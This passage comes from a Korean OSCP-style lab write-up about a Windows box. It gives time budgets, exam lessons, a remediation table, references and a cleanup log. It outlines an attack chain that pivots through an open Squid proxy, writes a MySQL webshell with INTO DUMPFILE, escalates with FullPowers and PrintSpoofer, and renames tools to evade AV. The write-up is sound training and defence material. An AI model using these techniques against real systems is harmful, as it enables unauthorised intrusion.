| 445 open, 자격증명 없음 | 익명 세션(`-N`)으로 공유 목록·사용자 열거 시도 가능 | Server 2019는 기본적으로 **익명 열거를 차단**한다. [가정] 실측 기록은 없으나, 프록시 경로가 이미 열려 있었으므로 여기에 시간을 쓸 이유가 없었다 |
| 49666/49667 (동적 RPC) | RPC 엔드포인트 매퍼가 넘겨준 고번호 포트 | 자격증명 없이는 대부분 접근 거부. **135가 열려 있으면 항상 따라 붙는 부산물**이고 그 자체가 단서가 아니다 |

> [!tip] "열려 있다"와 "쓸 수 있다"를 구분하라 — 시간 배분의 핵심
> 시험장에서 가장 비싼 실수는 **막다른 포트를 오래 파는 것**이다. 판단 기준은 하나다 — **"지금 내가 가진 것으로 이 포트를 진전시킬 수 있는가?"**
> - 자격증명 없음 + SMB → **거의 항상 막다른 길**이다. 익명 열거가 열려 있는 구버전이 아니면 15분 안에 접는다
> - 반면 프록시·웹은 **자격증명 없이도 진전이 가능**한 표면이다. 우선순위가 훨씬 높다
>
> 이 박스에서 3128을 먼저 판 것이 정답이었고, 그 판단의 근거는 "SMB로는 지금 할 수 있는 게 없다"는 **소거법**이었다.

### ⑪ 시간 배분 — 어디서 손절했어야 하는가

원문에 단계별 실측 시간 기록이 없으므로 아래는 **[가정] 권장 예산**이다.

| 단계 | 권장 예산 | 초과 시 판단 |
|---|---|---|
| nmap 전수 + 서비스 식별 | 10분 | `--min-rate`가 낮은지 확인 |
| **프록시 내부 포트 열거** | **10분** | 여기서 아무것도 안 나오면 **프록시가 통로가 아니라는 뜻** → SMB/RPC 쪽으로 방향 전환 |
| 웹앱 열거 + 버전 판정 | 20분 | gobuster 완주를 기다리지 말고 **타겟형 프로브로 전환**(③) |
| phpMyAdmin 로그인 + 웹셸 | 20분 | 30분 넘으면 자동화 스크립트를 버리고 **브라우저 + FoxyProxy로 수동 진행** |
| Windows 권한상승 | 30분 | `whoami /priv`가 3개면 **즉시 FullPowers를 떠올려야 한다.** 이걸 모르면 여기서 몇 시간이 날아간다 |

> [!danger] 이 박스에서 진짜 시간이 새는 곳은 두 군데뿐이다
> 1. **`whoami /priv`가 빈약할 때 다른 경로를 뒤지기 시작하는 것** — 서비스 오설정·언쿼티드 경로·레지스트리를 훑으면 한 시간이 그냥 간다. **계정이 `LOCAL SERVICE`면 FullPowers가 1순위다**
> 2. **`certutil` 성공 메시지를 믿는 것** — 도구가 안 먹는다고 판단해 다른 도구를 받고, 그것도 같은 이유로 사라지고… 무한 루프에 빠진다. **전송 후 `dir`가 습관이 되어 있어야 한다**

---

## 7. OSCP 시험 관점

1. **오픈 프록시는 공격면이 아니라 통로다.** 외부 스캔에서 웹 포트가 3128 하나뿐이라 막힌 것처럼 보이지만, 프록시 뒤에 MySQL·WinRM·WampServer가 전부 있었다. **프록시를 만나면 내부 포트 열거가 첫 수순**이다. 목적지는 반드시 **`127.0.0.1`**로 — 루프백 전용 바인드를 잡기 위해서다.
2. **판별 기준을 손으로 이해하고 있어라.** `503 ERR_CONNECT_FAIL`=닫힘, 그 외=열림, `403 ERR_ACCESS_DENIED`=ACL 차단(판별 불가). 도구(`spose`)가 오판할 때 직접 확인할 수 있어야 한다. **수동 대안은 `curl -x` 한 줄짜리 for 루프**이고, 이 박스에서 실제로 쓴 것도 그것이다.
3. **`CONNECT` 가능 여부를 먼저 확인하라.** 열려 있으면 프록시가 **범용 TCP 터널**이 되어 `proxychains`로 nmap·evil-winrm·mysql 클라이언트를 그대로 밀어 넣을 수 있다. 막혀 있으면 **HTTP로 표현 가능한 공격만** 남는다 — 이 제약이 공격 계획 전체를 결정한다.
4. **MySQL 파일 쓰기 전에 `@@secure_file_priv`를 확인한다.** `NULL`=차단, 빈 문자열=무제한, 경로=그 안에서만. 이걸 안 보고 페이로드를 던지면 실패 원인을 모른다. 단 [[Hawat]]처럼 **변수값과 실측이 어긋날 수 있으니 마커 파일 쓰기가 최종 근거**다.
5. **`INTO DUMPFILE`이 `INTO OUTFILE`보다 맞다.** `OUTFILE`은 구분자를 삽입해 정확한 바이트열을 깨뜨린다. 페이로드는 **hex 리터럴**로 넘겨 인용 계층을 통과시킨다. 둘 다 **기존 파일을 덮어쓰지 못한다**는 것도 함께 기억한다.
6. **Windows 셸을 잡으면 `whoami /priv`가 1번 명령이다.** 리눅스의 `id`·`sudo -l`에 해당한다. 개수가 아니라 **위험 특권(`SeImpersonate`·`SeDebug`·`SeBackup`·`SeRestore`·`SeTakeOwnership`·`SeLoadDriver`)이 있는지**를 본다.
7. **`SeImpersonatePrivilege`를 보면 Potato다.** build 17763(Server 2019/Win10 1809) 이상이면 **JuicyPotato는 죽었다.** `sc query spooler`로 Spooler가 살아 있으면 **PrintSpoofer**, 꺼져 있으면 EfsPotato/GodPotato, 그것도 안 되면 RoguePotato(아웃바운드 135 필요).
8. **`LOCAL SERVICE`의 특권은 "없는" 게 아니라 "박탈된" 것일 수 있다.** `whoami /priv`가 3개뿐이어도 **FullPowers**로 7개(=`SeImpersonate` 포함)를 되찾을 수 있다. 원리는 **작업 스케줄러가 SCM의 특권 축소를 적용하지 않는다**는 것. 이걸 모르면 PrintSpoofer 단계까지 못 간다.
9. **다운로드 "성공"을 믿지 말고 `dir`로 확인한다.** 유명 도구는 **파일명만으로도** 삭제된다. `fp.exe`·`ps.exe`처럼 바꿔서 재시도. 회피 순서는 **파일명 → 경로 → 전송수단 → 페이로드**이며, 가장 싼 것부터 시도한다.
10. **인용이 중첩되면 인코딩으로 도망간다.** SQL은 **hex 리터럴**(`0x3c3f...`), PowerShell은 **`-enc` UTF-16LE base64**, `cmd` 중첩은 **배치 파일**. 이 박스에 세 가지가 전부 나온다.
11. **`powershell -enc`의 base64는 UTF-16LE다.** `iconv -t UTF-16LE`를 빼면 무조건 실패한다. 리눅스 습관으로 `base64 -w0`만 치면 시간을 태운다.
12. **Windows에는 TTY 업그레이드가 없다.** `python3 -c 'import pty'`·`script -qc`는 해당 없다. 대신 **웹셸은 상태가 없다**고 가정하고 절대경로로 명령을 조립하며, 필요하면 `cmd /c "A && B"`로 묶는다. 대화형이 꼭 필요하면 리버스셸을 올리고 `rlwrap`을 리스너 쪽에 건다.
13. **비대화형 컨텍스트의 출력은 파일로 받는다.** `> C:\Users\Public\out.txt 2>&1` → `type out.txt`. `2>&1`을 빼면 실패 원인을 놓친다.
14. **플래그가 표준 위치에 없을 수 있다.** 여기서는 `C:\local.txt`. `C:\Users\*\Desktop\` 패턴에만 의존하지 말고 **`dir C:\`를 먼저** 본다. `-Recurse`는 셸을 몇 분간 블로킹시키니 피하고 `where /r`·`dir /s /b`를 쓴다.
15. **⚠️ 시험 금지 도구 관점 — 이 박스는 통과다.** sqlmap·metasploit·AutoRecon을 한 번도 쓰지 않았다. 자동 도구를 쓴 유일한 후보는 `spose.py`(프록시 포트 스캐너)인데 **실제로는 `curl` for 루프로 대체했다.** PrintSpoofer·FullPowers는 **단독 익스플로잇 바이너리**라 metasploit 제한과 무관하다. `msfvenom`으로 페이로드를 만드는 것도 허용이지만, 여기서는 `powershell -enc` 원라이너면 충분했다 — **AV 회피 관점에서도 msfvenom 산출물보다 낫다.**
16. **증거 스크린샷은 `ipconfig`다.** `ip a`가 아니다. `whoami; hostname; ipconfig; type <flag>`를 **한 화면에** 담는다.

---

## 8. 방어 관점

| 결함 | 조치 |
|---|---|
| **Squid `http_access allow all`** (오픈 프록시) | `acl localnet src <내부대역>` + `http_access allow localnet` + **`http_access deny all`**. 인증이 필요하면 `proxy_auth`. **이 하나만 고쳤어도 체인 전체가 시작조차 못 한다** |
| Squid가 `127.0.0.1` 목적지를 중계 | `acl to_localhost dst 127.0.0.0/8` + `http_access deny to_localhost` (기본 구성에 있는 규칙인데 무력화돼 있었다) |
| **MySQL `root` 빈 패스워드** | 강한 패스워드 설정. `mysql_secure_installation` 실행. 애플리케이션은 **최소권한 전용 계정**으로 접속 |
| **`@@secure_file_priv`가 빈 문자열** | 명시적 디렉터리(또는 `NULL`)로 설정. 애플리케이션 계정에서 **`FILE` 권한 회수** — 파일 쓰기 원시 자체를 제거한다 |
| mysqld가 웹루트에 쓰기 가능 | 웹루트는 배포 계정만 쓰기, 웹서버·DB 계정은 읽기 전용. **DB 프로세스와 웹루트의 권한 분리** |
| phpMyAdmin·adminer가 인증 없이 노출 | 관리 도구는 **웹루트에서 제거**하거나 IP 제한·별도 인증(HTTP Basic)·비표준 경로. 운영 서버에 두지 않는 것이 원칙 |
| **`testmysql.php`·`phpsysinfo` 진단 스크립트 방치** | 배포 시 삭제. `phpsysinfo`는 호스트명·OS 빌드·MAC·디스크까지 **인증 없이** 유출했다 |
| WampServer 기본 구성 그대로 운영 | 올인원 개발 패키지는 **개발 전용**이다. 운영에는 개별 설치 + 하드닝 |
| `LOCAL SERVICE`가 `SeImpersonatePrivilege`를 복원 가능 | 근본 차단은 어렵다. **탐지로 보완** — 서비스 계정에 의한 예약 작업 생성(이벤트 4698)과 비정상 명명 파이프 생성을 모니터링 |
| Print Spooler 실행 중 | 서버에서 인쇄가 불필요하면 **Spooler 서비스 비활성화**. PrintNightmare 계열 전체를 함께 막는다 |
| **Defender 실시간 보호 비활성** | 재활성화. 파일명 시그니처만으로는 이름 변경 한 번에 뚫린다 — **행위 기반 탐지 + ASR 규칙**이 필요 |
| 방화벽이 3128만 열어둔 것에 의존 | **포트 차단은 프록시 앞에서 무의미하다.** 프록시 자체를 통제하지 않으면 방화벽 정책이 우회된다 |

---

## 9. 참고 자료

- **CVE 없음** — 전부 오설정과 Windows 특권 모델의 정상 동작 조합이다
- Squid ACL 문서(`http_access`, `Safe_ports`, `SSL_ports`): http://www.squid-cache.org/Doc/config/http_access/
- `spose.py` (Squid Pivoting Open Port Scanner): https://github.com/aancw/spose
- MySQL `secure_file_priv`: https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar_secure_file_priv
- MySQL `SELECT ... INTO` (`OUTFILE` vs `DUMPFILE`): https://dev.mysql.com/doc/refman/5.7/en/select-into.html
- **FullPowers** (itm4n) — 서비스 계정 기본 특권 복원: https://github.com/itm4n/FullPowers
- itm4n, "Restoring the default privileges of a service account" — FullPowers의 원리 해설
- **PrintSpoofer** (itm4n): https://github.com/itm4n/PrintSpoofer
- itm4n, "PrintSpoofer — Abusing Impersonation Privileges on Windows 10 and Server 2019"
- RoguePotato: https://github.com/antonioCoco/RoguePotato · GodPotato: https://github.com/BeichenDream/GodPotato
- `ImpersonateNamedPipeClient` (MSDN) — `SeImpersonatePrivilege`를 요구하는 핵심 API
- LOLBAS `certutil.exe`: https://lolbas-project.github.io/lolbas/Binaries/Certutil/

## 남긴 흔적 (랩 정리용)

- **예약 작업**: FullPowers가 2회 실행되며 임시 예약 작업을 생성했으나 **토큰 획득 직후 스스로 삭제**한다. SYSTEM 셸에서 `schtasks /query` 및 `Get-ScheduledTask | Where TaskName -match FullPowers`로 **잔존 없음** 확인.
- **삭제 완료**: `C:\wamp\www\sh.php`, `C:\Users\Public\{fp.exe, ps.exe, go.bat, t.txt, priv_after.txt}`. `dir C:\Users\Public` 재확인 결과 기본 디렉터리 5개만 남음.
- 타겟 원본 데이터는 수정하지 않았다.
- 획득 자격증명: MySQL `root` / **빈 패스워드**.

## 관련 노트

- [[_WRITEUP-STANDARD]] — 이 노트의 작성 기준
- [[Hawat]] — `INTO OUTFILE` + hex 리터럴 웹셸, `@@secure_file_priv`가 `NULL`인데도 쓰기가 된 반례
- [[Exfiltrated]] — 인용 중첩을 base64로 회피 (같은 계열)
- [[Crane]] · [[RubyDome]] · [[Astronaut]] · [[Exghost]] — 누적 패턴 **"응답이 성공을 뜻하지 않는다"**. 이 박스의 `certutil` 성공 메시지가 같은 계열이다
- [[Hub]] · [[Levram]] — 누적 패턴 "버전 판정은 독립 근거 2개"
- [[01. Pentest Foundations]] — Squid 항목
- [[Crane]] · [[Hub]] · [[Levram]] · [[RubyDome]] · [[Astronaut]] — 같은 컬렉션 앞 박스 (전부 Linux)
